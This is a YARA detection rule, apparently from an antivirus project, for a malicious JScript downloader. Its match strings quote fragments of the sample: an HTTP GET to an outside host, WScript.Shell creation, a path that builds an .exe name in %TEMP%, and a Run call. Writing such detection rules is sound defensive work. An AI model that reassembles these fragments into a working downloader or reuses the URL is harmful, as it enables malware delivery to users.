rule sig_20160401_39c1feee8a4b3c8c96f557560fa7921f {
  meta:
    description = "datamaliciousorder - file 20160401_39c1feee8a4b3c8c96f557560fa7921f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "522d9bd0000b7ac75b887f421da363b1b1f3279e48368b7d49217c2f1d86fdc6"

  strings:
    $s1  = "HatOy[SosDsc](\"G\" + \"ET\", \"http://be-stlines-tore.com/j38sf\", false);" fullword ascii
    $s2  = "var GuUk = function OkqZzn() {return WScript[WyWj](\"WScript\"+\".Shell\");}(), CqcEzi = 11;" fullword ascii
    $s3  = "function CfkZpd(UuCz, BiaHr){HtIz = HtIz * 1; return UuCz - BiaHr;};" fullword ascii
    $s4  = "if (HatOy[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function XgJa(){return XptMx + \"\";};" fullword ascii
    $s6  = "function KzOj() {return ((FiMkz == true) && (FiMkz == FyNlv)) ? 1 : HtIz;};" fullword ascii
    $s7  = "var UcyCd = false;" fullword ascii
    $s8  = "function YkGhl()" fullword ascii
    $s9  = "}while (ZxAxm);" fullword ascii
    $s10 = "function SgPxs(){return WyWj;};" fullword ascii
    $s11 = "FyNlv = true; " fullword ascii
    $s12 = "function CpcCab() {return GuUk[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Gvrsp91LEm.ex\" + \"e\";};" fullword ascii
    $s13 = "var FyNlv = false;" fullword ascii
    $s14 = "var FiMkz = false;" fullword ascii
    $s15 = "function SpEk(LuPha){GuUk[\"R\"+\"un\"](LuPha, HtIz, HtIz);};" fullword ascii
    $s16 = "function WmRx(KeChu) {var HsrMjm = (1, 2, 3, 4, 5, KeChu); return HsrMjm;};" fullword ascii
    $s17 = "FiMkz = true; " fullword ascii
    $s18 = "function VmbMg(){return 23;};" fullword ascii
    $s19 = "var UjzUhp = new this[\"Date\"]();" fullword ascii
    $s20 = "return CfkZpd(ZlVyp, GthArh);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}